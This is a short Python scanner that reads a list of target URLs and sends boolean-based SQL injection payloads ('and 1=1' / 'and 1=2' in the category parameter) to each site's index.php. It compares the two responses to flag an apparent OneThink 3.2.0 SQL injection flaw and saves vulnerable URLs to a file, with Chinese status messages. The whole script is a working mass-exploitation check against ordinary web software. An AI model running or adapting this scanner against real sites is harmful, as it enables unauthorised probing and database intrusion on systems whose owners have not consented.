import sys
import json
import requests
import warnings
from termcolor import cprint


urls = open('url.txt')

poc = '/index.php/api/Uploadify/preview'



for i in urls:
    url = i.rstrip("\n")
    reqlst = []
    payload1 = [r"/index.php?c=article&a=index&category[0]==0))+and+1=1%23between&category[1]=a",
                r"/index.php?c=article&a=index&category[0]==0))+and+1=2%23between&category[1]=a"]
    for payload in payload1:
        vulnurl = url + payload
        try:
            print(vulnurl)
            req = requests.get(vulnurl, timeout=2, verify=False)
            reqlst.append(str(req.text))
            if len(reqlst[0]) != len(reqlst[1]) and r"分类不存在或被禁用" in reqlst[1]:
                print("[+]存在onethink3.2.0 SQL注入漏洞...(高危)\tpayload: " + vulnurl, "red")
                with open('洞3-2-0.txt', 'a')as f:
                    f.write(str(vulnurl) + '\n')
        except:
            print("[-] " + __file__ + "====>可能不存在漏洞", "cyan")

